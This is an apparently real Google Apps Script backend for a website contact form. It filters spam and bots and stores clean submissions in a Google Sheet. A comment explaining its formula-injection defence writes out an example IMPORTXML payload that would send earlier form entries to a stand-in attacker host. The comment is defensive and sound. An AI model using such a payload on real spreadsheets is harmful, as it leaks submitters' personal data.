/**
 * Google Apps Script backend for the Contact form.
 *
 * This code lives in the Apps Script project bound to the contact Google Sheet,
 * NOT in the site build. It is kept here only as a reference / source of truth.
 *
 * Deploy: Apps Script editor -> Deploy -> Manage deployments -> Edit (pencil)
 *         -> Version: New version -> Deploy. Keeps the same /exec URL, so no
 *         change is needed in src/pages/Contact.tsx.
 *
 * Access settings (must stay this way or the form 403s):
 *   Execute as:      Me
 *   Who has access:  Anyone
 *
 * Mirrors and extends the client-side validation in src/pages/Contact.tsx so
 * junk that bypasses the browser (bots POSTing straight to /exec) is rejected.
 * Bad/spam submissions return {result:'success'} on purpose: the site uses
 * mode:'no-cors' and cannot read the response, and returning "success" gives
 * bots no signal about what was filtered. Only clean data reaches the sheet.
 */

// ---- Config ---------------------------------------------------------------

var EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

// Disposable / throwaway email domains commonly used for junk.
var DISPOSABLE_DOMAINS = [
  'mailinator.com', 'guerrillamail.com', 'guerrillamail.info', '10minutemail.com',
  'tempmail.com', 'temp-mail.org', 'yopmail.com', 'trashmail.com', 'sharklasers.com',
  'getnada.com', 'dispostable.com', 'maildrop.cc', 'fakeinbox.com', 'throwawaymail.com',
  'mailnesia.com', 'mohmal.com', 'emailondeck.com', 'spam4.me', 'grr.la'
];

// Spam keywords / patterns seen in junk submissions.
var SPAM_KEYWORDS = [
  'seo service', 'rank your website', 'buy now', 'viagra', 'cialis',
  'casino', 'crypto investment', 'bitcoin', 'forex', 'loan offer', 'earn money',
  'work from home', 'click here', 'limited offer', 'increase traffic',
  'backlinks', 'guest post'
];

var MAX_LINKS = 2;            // reject messages with more URLs than this
var DEDUPE_WINDOW_MIN = 10;   // drop identical email+message within this many minutes
var MIN_INTERVAL_SEC = 5;     // best-effort flood guard per identical payload

// ---- Entry point ----------------------------------------------------------

function doPost(e) {
  try {
    var p = (e && e.parameter) || {};
    var name    = _clean(p.name);
    var email   = _clean(p.email).toLowerCase();
    var message = _clean(p.message);
    var company = _clean(p.company); // honeypot (hidden field)

    // 1. Honeypot filled => bot. Silently drop.
    if (company) return _drop('honeypot');

    // 2. Field-level validation (mirror of the browser checks).
    if (name.length < 2 || name.length > 100)           return _drop('bad name length');
    if (!/[a-zA-ZÀ-ɏ]/.test(name))            return _drop('name has no letters');
    if (/https?:\/\//i.test(name))                      return _drop('url in name');
    if (!EMAIL_REGEX.test(email) || email.length > 254) return _drop('bad email');
    if (message.length < 5 || message.length > 5000)    return _drop('bad message length');

    // 3. Disposable email domains.
    var domain = email.split('@')[1] || '';
    if (DISPOSABLE_DOMAINS.indexOf(domain) !== -1)      return _drop('disposable email');

    // 4. Link-spam.
    var linkCount = (message.match(/https?:\/\//gi) || []).length;
    if (linkCount > MAX_LINKS)                           return _drop('too many links');

    // 5. Spam keywords.
    var lower = (name + ' ' + message).toLowerCase();
    for (var i = 0; i < SPAM_KEYWORDS.length; i++) {
      if (lower.indexOf(SPAM_KEYWORDS[i]) !== -1)        return _drop('spam keyword: ' + SPAM_KEYWORDS[i]);
    }

    // 6. Gibberish heuristics: long runs of one char, or no spaces in a long message.
    if (/(.)\1{7,}/.test(message))                       return _drop('repeated chars');
    if (message.length > 40 && message.indexOf(' ') === -1) return _drop('no spaces');

    // 7. Flood guard: ignore an identical payload seen within the last few seconds.
    var cache = CacheService.getScriptCache();
    var fp = Utilities.base64Encode(email + '|' + message).substring(0, 200);
    if (cache.get('flood_' + fp)) return _drop('flood');
    cache.put('flood_' + fp, '1', MIN_INTERVAL_SEC);

    // 8. Dedupe: skip identical email+message inside the window.
    if (_isDuplicate(email, message)) return _drop('duplicate');

    // Passed all checks -> store. Values are escaped so Sheets stores them as
    // text, never as live formulas (see _sheetSafe).
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    sheet.appendRow([new Date(), _sheetSafe(name), _sheetSafe(email), _sheetSafe(message)]);

    return _json({ result: 'success' });
  } catch (err) {
    return _json({ result: 'error', message: 'server error: ' + err });
  }
}

// ---- Helpers ---------------------------------------------------------------

// Collapse all whitespace (incl. newlines/tabs used for injection) to single spaces, then trim.
function _clean(v) {
  return String(v || '').replace(/\s+/g, ' ').trim();
}

// Neutralises spreadsheet formula injection.
//
// appendRow() writes strings through the same parser as typed input, so a
// submission beginning with = + - @ (or a tab/CR that Sheets strips before
// parsing) is stored as a LIVE FORMULA, not text. A message of
//   =IMPORTXML("https://attacker.tld/?d="&CONCATENATE(C1:D50),"//a")
// would then run when the sheet is opened and POST earlier submissions
// (names, emails, messages) to the attacker. The same payload is also a CSV
// injection vector for anyone who exports the sheet and opens it in Excel.
//
// Prefixing with an apostrophe forces Sheets to treat the value as text; the
// apostrophe is a display-only marker and is not part of the stored string.
function _sheetSafe(v) {
  var s = String(v || '');
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// Bad data is logged but returns "success" so bots get no useful signal.
function _drop(reason) {
  try { console.warn('Dropped submission: ' + reason); } catch (e) {}
  return _json({ result: 'success' });
}

// Scans the last few rows for an identical email+message inside the window.
function _isDuplicate(email, message) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var last = sheet.getLastRow();
  if (last < 2) return false;
  var scan = Math.min(50, last - 1);                 // only check recent rows
  var rows = sheet.getRange(last - scan + 1, 1, scan, 4).getValues(); // [date,name,email,msg]
  var cutoff = new Date(Date.now() - DEDUPE_WINDOW_MIN * 60 * 1000);
  for (var i = 0; i < rows.length; i++) {
    var ts = rows[i][0];
    if (ts instanceof Date && ts < cutoff) continue;
    if (String(rows[i][2]).toLowerCase() === email &&
        String(rows[i][3]) === message) {
      return true;
    }
  }
  return false;
}

function _json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
